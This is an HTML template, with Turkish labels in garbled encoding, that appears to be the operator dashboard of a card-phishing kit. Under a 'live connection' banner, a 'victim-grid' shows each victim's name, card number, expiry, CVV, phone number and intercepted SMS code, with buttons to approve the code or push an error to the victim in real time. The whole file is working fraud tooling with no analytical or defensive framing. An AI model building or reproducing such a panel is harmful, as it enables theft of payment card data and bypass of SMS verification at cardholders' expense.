<div class="dashboard-container" style="background:#000; min-height:100vh; padding:20px;">
    <div style="display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid #1a1a1a; padding-bottom:15px; margin-bottom:30px;">
        <h1 style="color:#fff; font-size:20px;">ğŸ–ï¸ Operasyon AkÄ±ÅŸÄ±</h1>
        <div style="color:#0f0; font-size:12px;">CANLI BAÄLANTI: AKTÄ°F</div>
    </div>

    <div id="victim-grid" style="display:grid; grid-template-columns: repeat(auto-fill, minmax(400px, 1fr)); gap:20px;">
        <div class="card" style="background:#0a0a0a; border:1px solid #1d1d1f; border-radius:15px; padding:20px;">
            <div style="display:flex; justify-content:space-between; color:#86868b; font-size:12px;">
                <b>${victimName}</b>
                <span style="background:#1a1a1a; padding:2px 8px; border-radius:4px;">${status}</span>
            </div>
            <div style="margin:15px 0; background:#000; padding:15px; border-radius:10px; color:#0f0; font-family:monospace; border:1px solid #0f03;">
                <p>${cardNumber}</p>
                <p>EXP: ${exp} | CVV: ${cvv}</p>
                <p>TEL: ${tel}</p>
            </div>
            <h2 style="text-align:center; color:#0f0; font-size:32px; text-shadow:0 0 10px #0f05;">${smsCode}</h2>
            <div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px; margin-top:20px;">
                <button class="btn-approve">ONAYLA</button>
                <button class="btn-error">HATA BAS</button>
            </div>
        </div>
    </div>
</div>
